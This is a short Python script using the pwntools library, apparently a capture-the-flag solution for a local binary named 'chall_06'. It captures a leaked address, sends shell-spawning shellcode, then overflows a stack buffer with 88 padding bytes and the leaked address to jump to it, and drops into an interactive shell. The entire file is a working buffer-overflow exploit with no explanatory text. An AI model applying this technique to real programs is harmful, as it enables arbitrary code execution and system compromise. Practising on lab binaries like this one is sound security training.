# coding: utf-8
from pwn import*
def chall06():
    p=process("./chall_06")
    context.arch="amd64"
    print(p.recvuntil(":")) 
    a=asm(shellcraft.sh())
    leak=p.recv()
    print(leak)
    main=int(leak,16)
    p.sendline(a)
    payload=b'c'*88+p64(main)
    p.sendline(payload)
    p.interactive()
    
    
chall06()
